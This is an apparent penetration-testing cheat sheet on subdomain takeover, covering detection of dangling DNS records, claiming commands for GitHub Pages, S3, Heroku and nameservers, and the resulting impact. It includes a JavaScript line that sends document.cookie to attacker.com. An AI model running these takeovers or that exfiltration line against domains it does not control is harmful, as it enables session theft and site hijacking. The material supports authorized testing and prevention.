# Subdomain Takeover

Claim abandoned third-party services that a subdomain still points to.

## TL;DR

```bash
# Find dangling CNAME
dig sub.target.com CNAME
# If points to deleted resource → register it → takeover

# Quick scan
subfinder -d target.com | nuclei -tags takeover
```

## How It Works

1. Subdomain has CNAME/A record pointing to third-party service
2. Third-party account/resource deleted or never claimed
3. Attacker registers same resource name
4. Subdomain now serves attacker content

## Detection

### DNS Record Types

| Type | Example | Impact |
|------|---------|--------|
| CNAME | → *.github.io | Most common |
| A/AAAA | → Decommissioned IP | Content control |
| NS | → Unclaimed nameserver | Complete DNS control |
| MX | → Dead mail server | Email interception |

### Known Fingerprints

| Service | Error Indicator |
|---------|-----------------|
| GitHub Pages | "There isn't a GitHub Pages site here" |
| Heroku | "No such app" |
| AWS S3 | "NoSuchBucket" |
| Azure | "404 Web Site not found" |
| Shopify | "Sorry, this shop is currently unavailable" |
| Fastly | "Fastly error: unknown domain" |
| Zendesk | "Help Center Closed" |

### Automated Detection

```bash
# Subdominator (comprehensive)
subdominator -d target.com

# Nuclei with takeover templates
subfinder -d target.com -silent | nuclei -tags takeover

# Subjack
subjack -w subdomains.txt -t 100 -ssl

# BBOT (all-in-one)
bbot -t target.com -f subdomain-enum -m subdomain-takeover
```

## Exploitation

### GitHub Pages
```bash
# 1. Check CNAME returns: username.github.io
dig sub.target.com CNAME

# 2. Create repo named: username.github.io
# 3. Add CNAME file containing "sub.target.com"
# 4. Push to GitHub
```

### AWS S3
```bash
# 1. CNAME → bucketname.s3.amazonaws.com
# 2. Check bucket doesn't exist
aws s3 ls s3://bucketname  # "bucket does not exist"

# 3. Create bucket with same name
aws s3 mb s3://bucketname --region us-east-1
aws s3 website s3://bucketname --index-document index.html
```

### Heroku
```bash
# CNAME → appname.herokuapp.com
heroku create appname
heroku domains:add sub.target.com
```

### NS Record Takeover (High Impact)

```bash
dig sub.target.com NS
# Returns: ns1.deadservice.com

# Register deadservice.com or claim ns1 subdomain
# Now control ALL DNS for sub.target.com
```

**Impact:** Complete control → MX records, SPF, etc.

## Impact

### Cookie Theft
Subdomains often share cookies with parent domain.
```javascript
// On taken-over subdomain
document.location = 'https://attacker.com/steal?c=' + document.cookie;
```

### OAuth Token Theft
If subdomain in `redirect_uri` whitelist:
```
/oauth/authorize?redirect_uri=https://takeover.target.com/callback
```

### CSP Bypass
If subdomain whitelisted:
```http
Content-Security-Policy: script-src 'self' *.target.com
```

### CORS Bypass
```http
Access-Control-Allow-Origin: https://sub.target.com
```

### SSL Certificates
Attacker can obtain valid cert via HTTP validation (Let's Encrypt).

## Tools

| Tool | Purpose |
|------|---------|
| [can-i-take-over-xyz](https://github.com/EdOverflow/can-i-take-over-xyz) | Service fingerprints DB |
| [Subdominator](https://github.com/Stratus-Security/Subdominator) | Modern scanner |
| [nuclei](https://github.com/projectdiscovery/nuclei) | `-tags takeover` |
| [subjack](https://github.com/haccer/subjack) | Fast detection |

### Data Sources

- [SecurityTrails](https://securitytrails.com/) - Historical DNS
- [crt.sh](https://crt.sh/) - Certificate transparency
- [Chaos](https://chaos.projectdiscovery.io/) - Subdomain datasets

## Prevention

1. Remove DNS records before deleting resources
2. Create resources before adding DNS records
3. Monitor for dangling records continuously
4. Use providers that verify domain ownership
